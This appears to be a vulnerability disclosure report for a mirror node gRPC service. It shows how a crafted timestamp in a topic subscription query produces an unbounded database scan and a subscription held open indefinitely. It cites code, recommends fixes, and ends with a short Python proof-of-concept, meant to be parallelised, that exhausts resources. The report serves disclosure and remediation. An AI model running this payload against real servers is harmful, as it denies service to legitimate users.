### Title
Unbounded Topic Message Scan via Crafted Timestamp in `convertTimestamp()` Enabling Resource Exhaustion

### Summary
An unprivileged external user can send a `ConsensusTopicQuery` with `consensusStartTime.seconds=0` and `consensusEndTime.seconds=9223372035` (at or above the threshold in `convertTimestamp()`), causing the server to create a subscription filter spanning `[0, Long.MAX_VALUE)`. All existing validation checks pass for this input, forcing the retriever to page through every stored message for the targeted topic and hold an indefinite live subscription, enabling griefing-level resource exhaustion with no authentication required.

### Finding Description

**Exact code path:**

`convertTimestamp()` in `ConsensusController.java` lines 76–81:
```java
private long convertTimestamp(Timestamp timestamp) {
    if (timestamp.getSeconds() >= 9223372035L) {
        return Long.MAX_VALUE;
    }
    return DomainUtils.timestampInNanosMax(timestamp);
}
``` [1](#0-0) 

When `consensusEndTime.seconds = 9223372035`, the condition `>= 9223372035L` is true and `Long.MAX_VALUE` (`9223372036854775807`) is returned as `endTime`. [2](#0-1) 

**Validation checks and why they fail to block this:**

`TopicMessageFilter` has two `@AssertTrue` validators: [3](#0-2) 

- `isValidEndTime()`: requires `endTime > startTime`. With `startTime=0` and `endTime=Long.MAX_VALUE`, this is `Long.MAX_VALUE > 0` → **passes**.
- `isValidStartTime()`: requires `startTime <= DomainUtils.now()`. With `startTime=0`, this is `0 <= now` → **passes**.

No check bounds the magnitude of the time window or the value of `endTime` itself.

**Database query impact:**

`TopicMessageRepositoryCustomImpl.findByFilter()` builds:
```sql
WHERE topic_id = X AND consensus_timestamp >= 0 AND consensus_timestamp < 9223372036854775807
``` [4](#0-3) 

With no `limit` set (`limit=0`), `typedQuery.setMaxResults()` is never called, and the retriever pages through all results using `maxPageSize` until `isComplete()` returns true (when a page is smaller than `maxPageSize`). [5](#0-4) 

**Live subscription held indefinitely:**

After historical retrieval, `pastEndTime()` is used to terminate the live stream. With `endTime=Long.MAX_VALUE`, the end-time condition is never reached in practice, so the live subscription remains open indefinitely consuming server and DB resources. [6](#0-5) 

### Impact Explanation

Each malicious subscription forces: (1) a full paginated scan of all stored messages for the targeted topic, loading them into memory and streaming them over the network; (2) an indefinitely held gRPC connection and associated reactive pipeline. Multiple concurrent subscriptions multiply the DB read load and connection count. The `subscriberCount` gauge tracks this but enforces no limit. [7](#0-6) 

On a high-volume topic (e.g., a popular HCS topic with millions of messages), this can saturate DB I/O, exhaust connection pool threads, and degrade service for legitimate subscribers. Severity is **Medium** (griefing/DoS, no economic theft).

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is publicly accessible with no authentication. The attack requires only a valid `topicId` (discoverable from public mirror node REST APIs) and a crafted protobuf message. It is trivially repeatable and parallelizable from a single client. No special privileges, keys, or on-chain transactions are needed. [8](#0-7) 

### Recommendation

1. **Cap `endTime` to a reasonable future horizon** in `convertTimestamp()` or in `TopicMessageFilter` validation — e.g., reject or clamp `endTime` values more than N hours/days beyond `now`.
2. **Add a maximum window size check** in `TopicMessageFilter.isValidEndTime()`: `endTime - startTime <= MAX_ALLOWED_WINDOW_NANOS`.
3. **Enforce a maximum subscriber count** per IP or globally, rejecting new subscriptions when the limit is reached.
4. **Require a non-zero `limit`** for subscriptions with `startTime` far in the past, or enforce a default maximum result cap.

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1234),  # any valid topic
    consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    consensusEndTime=timestamp_pb2.Timestamp(seconds=9223372035, nanos=0),
    # limit intentionally omitted (defaults to 0 = unlimited)
)

# This subscription:
# 1. Passes all validation (endTime=Long.MAX_VALUE > startTime=0, startTime=0 <= now)
# 2. Forces full scan of ALL messages for topicNum=1234
# 3. Holds connection indefinitely after historical scan
for response in stub.subscribeTopic(query):
    pass  # attacker can open N parallel connections
```

**Verification steps:**
1. Confirm `convertTimestamp(Timestamp{seconds=9223372035})` returns `Long.MAX_VALUE` (line 77–79 of `ConsensusController.java`).
2. Confirm `TopicMessageFilter` with `startTime=0, endTime=Long.MAX_VALUE` passes both `@AssertTrue` validators.
3. Observe in DB query logs: `consensus_timestamp >= 0 AND consensus_timestamp < 9223372036854775807` with no `LIMIT` clause.
4. Open 10+ parallel such subscriptions and observe DB CPU/I/O spike and `hiero.mirror.grpc.subscribers` gauge increase with no enforced ceiling.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L76-81)
```java
    private long convertTimestamp(Timestamp timestamp) {
        if (timestamp.getSeconds() >= 9223372035L) {
            return Long.MAX_VALUE;
        }
        return DomainUtils.timestampInNanosMax(timestamp);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L43-51)
```java
    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }

    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L38-53)
```java
        Predicate predicate = cb.and(
                cb.equal(root.get(TOPIC_ID), filter.getTopicId()),
                cb.greaterThanOrEqualTo(root.get(CONSENSUS_TIMESTAMP), filter.getStartTime()));

        if (filter.getEndTime() != null) {
            predicate = cb.and(predicate, cb.lessThan(root.get(CONSENSUS_TIMESTAMP), filter.getEndTime()));
        }

        query = query.select(root).where(predicate).orderBy(cb.asc(root.get(CONSENSUS_TIMESTAMP)));

        TypedQuery<TopicMessage> typedQuery = entityManager.createQuery(query);
        typedQuery.setHint(HibernateHints.HINT_READ_ONLY, true);

        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L65-79)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/consensus_service.proto (L47-49)
```text
service ConsensusService {
    rpc subscribeTopic (ConsensusTopicQuery) returns (stream ConsensusTopicResponse);
}
```
